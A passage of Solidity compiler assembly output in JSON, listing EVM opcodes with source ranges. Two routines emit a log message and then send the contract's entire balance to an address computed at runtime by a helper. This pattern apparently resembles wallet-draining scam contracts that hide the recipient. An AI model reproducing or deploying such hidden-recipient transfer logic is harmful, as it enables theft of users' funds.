											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "tag",
											"source": 0,
											"value": "31"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "KECCAK256",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "tag",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "32"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "PUSH",
											"source": 0,
											"value": "1F"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "tag",
											"source": 0,
											"value": "30"
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 568,
											"end": 593,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14787,
											"end": 14971,
											"name": "tag",
											"source": 0,
											"value": "24"
										},
										{
											"begin": 14787,
											"end": 14971,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH data",
											"source": 0,
											"value": "9FB03945078BC6C7000C07D459687B271AE0ADC059777DEE3669B3C70B385107"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "38"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14834,
											"end": 14897,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 14915,
											"end": 14931,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 14915,
											"end": 14929,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 14915,
											"end": 14931,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14915,
											"end": 14931,
											"name": "tag",
											"source": 0,
											"value": "34"
										},
										{
											"begin": 14915,
											"end": 14931,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14941,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 14907,
											"end": 14941,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 14942,
											"end": 14963,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "37"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 14907,
											"end": 14964,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14787,
											"end": 14971,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15082,
											"end": 15269,
											"name": "tag",
											"source": 0,
											"value": "26"
										},
										{
											"begin": 15082,
											"end": 15269,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "CF34EF537AC33EE1AC626CA1587A0A7E8E51561E5514F8CB36AFA1C5102B3BAB"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP3",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH data",
											"source": 0,
											"value": "6350D1A48231284A8341DBB6CEC434401EEC03DD1DB1D0D6D2F253F7A8B3ECA6"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "33"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "CODECOPY",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15134,
											"end": 15192,
											"name": "LOG1",
											"source": 0
										},
										{
											"begin": 15210,
											"end": 15229,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 15210,
											"end": 15227,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15210,
											"end": 15229,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 15210,
											"end": 15229,
											"name": "tag",
											"source": 0,
											"value": "39"
										},
										{
											"begin": 15210,
											"end": 15229,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15239,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 15202,
											"end": 15239,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 15240,
											"end": 15261,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "42"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY",
											"source": -1
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE",
											"source": -1
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"source": -1,
											"value": "42"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 15202,
											"end": 15262,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15082,
											"end": 15269,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 14508,
											"end": 14617,
											"name": "tag",
											"source": 0,
											"value": "35"
										},
										{
											"begin": 14508,
											"end": 14617,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14557,
											"end": 14564,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 14583,
											"end": 14610,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 14596,
											"end": 14609,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "45"
										},
										{
											"begin": 14596,
											"end": 14607,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 14596,
											"end": 14609,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14596,
											"end": 14609,
											"name": "tag",
											"source": 0,
											"value": "45"
										},
										{
											"begin": 14596,
											"end": 14609,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14583,
											"end": 14595,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 14583,
											"end": 14610,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 14583,
											"end": 14610,
											"name": "tag",
											"source": 0,
											"value": "44"
										},
										{
											"begin": 14583,
											"end": 14610,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 14576,
											"end": 14610,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14576,
											"end": 14610,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 14508,
											"end": 14617,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 14508,
											"end": 14617,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 15993,
											"end": 16105,
											"name": "tag",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 15993,
											"end": 16105,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16045,
											"end": 16052,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 16071,
											"end": 16098,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 16084,
											"end": 16097,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "50"
										},
										{
											"begin": 16084,
											"end": 16095,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 16084,
											"end": 16097,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16084,
											"end": 16097,
											"name": "tag",
											"source": 0,
											"value": "50"
										},
										{
											"begin": 16084,
											"end": 16097,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16071,
											"end": 16083,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "47"
										},
										{
											"begin": 16071,
											"end": 16098,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 16071,
											"end": 16098,
											"name": "tag",
											"source": 0,
											"value": "49"
										},
										{
											"begin": 16071,
											"end": 16098,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 16064,
											"end": 16098,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 16064,
											"end": 16098,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 15993,
											"end": 16105,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 15993,
											"end": 16105,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 12945,
											"end": 13847,
											"name": "tag",
											"source": 0,
											"value": "46"
										},
										{
											"begin": 12945,
											"end": 13847,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12991,
